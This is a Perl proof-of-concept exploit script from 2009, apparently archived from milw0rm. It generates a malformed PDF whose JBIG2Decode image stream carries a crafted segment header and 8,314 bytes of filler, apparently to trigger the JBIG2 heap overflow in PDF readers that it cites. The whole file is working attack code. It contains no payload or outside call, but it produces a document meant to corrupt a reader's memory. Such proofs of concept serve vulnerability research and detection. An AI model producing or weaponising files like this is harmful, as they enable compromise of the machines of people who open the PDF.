#!/usr/bin/perl
# k`sOSe 02/22/2009

# http://vrt-sourcefire.blogspot.com/2009/02/have-nice-weekend-pdf-love.html

my $size = "\x40\x00";
my $factor = "ABCD";
my $data = "A" x 8314;


print pdf();

sub pdf() 
{

"%PDF-1.5\n" .
"%\xec\xf5\xf2\xe1\xe4\xef\xe3\xf5\xed\xe5\xee\xf4\n" .
"3 0      \n" .
"xref\n" .
"3 16\n" .
"0000000023 00000 n \n" .
"0000000584 00000 n \n" .
"0000000865 00000 n \n" .
"0000001035 00000 n \n" .
"0000001158 00000 n \n" .
"0000001287 00000 n \n" . 
"0000001338 00000 n \n" .
"0000001384 00000 n \n" .
"0000002861 00000 n \n" .
"0000003637 00000 n \n"  .
"0000005126 00000 n \n" .
"0000005173 00000 n \n" .
"0000005317 00000 n \n" .
"0000005370 00000 n \n" .
"0000005504 00000 n \n" .
"0000000714 00000 n \n" .
"trailer\n" .
"<</Root 4 0 R/Info 2 0 R/ID[<AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA> <AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>]/Size 19/Prev 10218>>\n" .
"startxref\n" .
"0\n" .
"%%EOF\n" .
"   \n" .
"4 0 obj\n" .
"<</Type/Catalog/Pages 1 0 R/OCProperties<</OCGs[9 0 R 13 0 R]/D<</Order[9 0 R 13 0 R]/ON[9 0 R 13 0 R]/OFF[]>>>>>>\n" .
"endobj\n" .
"         \n" .
"5 0 obj\n" .
"<</Type/Page/MediaBox[0 0 640 480]/Resources<</XObject<</Im001 7 0 R/Im002 10 0 R/Im003 11 0 R/Im004 14 0 R/Im005 16 0 R>>>>/Contents 6 0 R/Parent 1 0 R>>\n" .
"endobj\n" .
"6 0 obj\n" .
"<</Length 56/Filter/FlateDecode>>\n" .
"stream\n" .
"x\x9c\xe3*T031P\x00A\x13\x0b\x08\x9d\x9c\xab\xa0\xef\x99k``\xa8\xe0\x92\xaf\x10\xc8\x85[\x81\x11!\x05\xc6\x84\x14\x98\xc0\x14\xc0\$\@\xb4\x05\xb2\n" .
"S\xb0\n" .
"\x00J\x15#,\n" .
"endstream\n" .
"endobj\n" .

"12 0 obj\n" .
"<</Subtype/Image/Width 640/Height 480/ColorSpace/DeviceGray/BitsPerComponent 1/Decode[1 0]/Interpolate true/Length 1314/Filter/JBIG2Decode>>\n" .
"stream\n" .
"\x00\x00\x00\x01" . $size . $factor . "\x13" . $data . "endstream\n" .
"endobj\n" .
"13 0 obj\n" .
"<</Type/OCG/Name(Text Color)>>\n" .
"endobj\n" .
"14 0 obj\n" .
"<</Subtype/Image/Width 1/Height 1/ColorSpace/DeviceGray/BitsPerComponent 8/SMask 12 0 R/OC 15 0 R/Length 1>>\n" .
"stream\n" .
"\x00\n" .
"endstream\n" .
"endobj\n" .

"1 0 obj\n" .
"<</Type/Pages/Kids[5 0 R]/Count 1>>\n" .
"endobj\n" .
"xref\n" . 
"0 3\n" . 
"0000000000 65535 f \n" .
"0000009988 00000 n \n" .
"0000010039 00000 n \n" .
"trailer\n" .
"<</ID[<AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA> <AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>]/Size 3>>\n" .
"startxref\n" .
"104\n" .
"%%EOF\n";

}

# milw0rm.com [2009-02-23]
